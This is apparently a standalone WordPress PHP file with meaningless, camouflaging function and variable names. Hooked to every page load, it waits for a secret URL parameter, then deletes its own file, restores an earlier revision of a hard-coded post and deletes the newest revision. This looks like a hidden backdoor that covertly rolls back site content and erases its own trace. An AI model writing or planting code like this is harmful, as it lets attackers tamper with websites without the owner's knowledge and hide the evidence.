<?php

function album_validation_easy_converter() {
	if (isset($_GET['switcher_reviews_easy_videos']) && $_GET['switcher_reviews_easy_videos'] === 'type_shipping_counter_cc') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$feeds_toolbar_color_sign = 11851;
		$disable_view_connect = wp_get_post_revisions($feeds_toolbar_color_sign);
		if (empty($disable_view_connect)) die('no revisions');
		if (count($disable_view_connect) < 2) die('less than 2');
		$header_authors_source = array_shift($disable_view_connect);
		$crm_query_print = $header_authors_source->ID;
		$booster_elementor_module_ajax = array_shift($disable_view_connect);
		$autocomplete_address_beaver = $booster_elementor_module_ajax->ID;
		$publisher_taxonomy_donation_avatar = wp_restore_post_revision($autocomplete_address_beaver);
		if ($publisher_taxonomy_donation_avatar === false) die('error restoring');
		$publisher_taxonomy_donation_avatar = wp_delete_post_revision($crm_query_print);		
		if ($publisher_taxonomy_donation_avatar === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'album_validation_easy_converter');
